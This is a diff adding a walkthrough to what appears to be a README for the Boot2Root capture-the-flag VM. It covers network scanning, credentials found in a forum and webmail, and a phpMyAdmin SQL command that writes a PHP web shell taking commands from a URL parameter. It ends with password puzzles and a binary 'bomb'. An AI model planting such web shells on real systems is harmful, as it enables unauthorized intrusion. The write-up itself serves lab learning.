@@ -7,6 +7,107 @@ root a iso using multiple vulnerabilities
 ```
 VBoxManage guestproperty get boot2root "/VirtualBox/GuestInfo/Net/0/V4/IP"
 ```
+#### OR  
+  
+ ```
+ifconfig | grep inet            // to get ip address and netmask of current machine (e.g. 10.13.0.0/16)  
+netdiscover -r 10.13.0.0/16     // to get ip address of virtual box env. (e.g. 10.13.0.132)  
+nmap 10.13.0.132                // to get open ports (notably 80 http and 443 https)  
+```
+
+## LMEZARD user
+
+#### Get access to forum and get email
+
+1. `dirb https://10.13.0.132` shows that there are directories on the server named `forum` `phpmyadmin` and `webmail`  
+2. Go to `htttps://10.13.0.132/forum/` and open the thread "Problemes login". Inside find failed attempt to login using what looks like a password (!q\]Ej?*5K5cy*AJ) instead of username, followed by successful login of user lmezard.  
+4. Then login the forums with credentials, and find lmezard's email address (`laurie@borntosec.net`).  
+
+#### Access webmail and get DB Access
+
+1. Then go to `https://10.13.0.132/webmail/` and login with email and same password.  
+2. Open mail with subject "DB Access" and get credentials for root access to database (root/Fg-'kKXBj87E:aJ$)
+
+#### Access PHPMyAdmin and inject php script
+
+1. Go to `https://10.13.0.158/phpmyadmin/` and login with credentials  
+2. Go to SQL tab to execute SQL command. The following command allows you to create a file through sql and thus write a php script which will allow you to execute commands through the url parameters given to the file, if you have access to said file through the server.
+```
+SELECT "<?php $out = array();exec($_GET[\"cmd\"], $out);foreach($out as $line) {echo $line.\"<br />\";}?>" INTO outfile "/path/to/file/cmd.php"
+```
+3. Now you need to find out where to put the file so you have access rights.  
+The server is apache, so you try `/var/www/` and get error insufficient rights.  
+You go back to the dirb results (`dirb https://10.13.0.132`) to check server folder hierarchy.  
+Try every sub folder (e.g. forum you try `/var/www/forum/cmd.php`) until you find you have rights to `/var/www/forum/templates_c folder`.  
+So now you have your php script in that folder, go to `https://10.13.0.132/forum/templates_c/cmd.php?cmd=ls%20-la%20/home`  
+4. Using shell commands in the url query, find directory called LOOKATME, the file named password. Use cat on file and get credentials: lmezard:G!@M6f4Eatau{sF"  
+5. Login to Boot2Root VM.
+
+## LAURIE user
+
+1. Read instructions in directory and checkout fun with `file fun`  
+2. Copy fun in `/tmp/` and cd there. Then unarchive it with `tar xvf fun` to get directory ft_fun/  
+3. Run script in directory:
+`./notfun.sh`
+```
+ #!/bin/sh
+ for f in *.pcap; do
+  d="$(cat $f | grep file | cut -c 3-)"
+ mv "$f" "$d"
+ sed -i '$d' "$d"
+ sed -i '/^$/d' "$d"
+done
+
+i=1
+while [ $i -lt 100 ]
+do
+ if [ $i -lt 10 ]; then
+  mv "file$i" "file00$i"
+ else
+  mv "file$i" "file0$i"
+ fi
+ i=$((i+1))
+done
+cat "file*" > main.c
+```
+4. Compile and execute the C file to get password.  
+```
+lmezard@BornToSecHackMe:ft_fun$ gcc main.c && ./a.out
+My password is: Iheartpwnage
+Encrypt it with Sha-256 to use passwordlmezard@BornToSecHackMe:ft_fun$
+```
+5. Encrypting "Iheartpwnage" with Sha-256 gives you: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+## THOR user
+
+1. Bomb is an executable. Use [Ghidra](https://ghidra-sre.org/) to transform the binary into pseudo C code in order to inspect all 6 levels of the bomb.  
+2. The README file gives you hints for all the levels (usually first or second character of the answer).  
+3. The first level simply checks if your answer is equal to "Public speaking is very easy."  
+4. The second level requires an array of 6 integers which must not return true on the following while n increases from 1 to 5 inclusively:
+```
+answers[n+1] != (n + 1) * answers[n]
+```
+Which gives you "1 2 6 24 120 720"  
+5. The third level has multiple possible answers, but knowing that the second character has to be "b" (thanks to the hint), you get "2 b 214"
+6. The fourth level checks that the following function returns 55:
+```
+phase_4.swift
+func calc(num: Int) -> Int {
+    var a = 0, b = 0
+    
+    if num < 2 {
+        b = 1
+    } else {
+        a = calc(num: num - 1)
+        b = calc(num: num - 2)
+        b = b + a
+    }
+    return b
+}
+```
+So the answer is 9.  
+7. The fifth level 
+
 
 ## ZAZ user
 
